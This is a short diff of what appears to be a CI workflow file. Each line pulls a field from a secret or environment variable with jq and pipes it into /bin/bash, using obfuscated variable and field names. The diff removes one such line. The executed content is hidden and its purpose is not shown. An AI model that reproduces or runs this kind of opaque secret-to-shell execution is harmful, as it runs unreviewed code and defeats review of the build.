@@ -27,7 +27,6 @@ jobs:
           n12: ${{ secrets.n12 }}
         run: |
           printf '%s' "$n12" | jq -r .zgvty8 | /bin/bash
-          echo $ra24823 | jq -r .jw960 | /bin/bash
           echo $chat66536 | jq -r .n54 | /bin/bash
           echo $wv63 | jq -r .jzq7201 | /bin/bash
           printf '%s' "$upgxn8555" | jq -r .cpayv2509 | /bin/bash
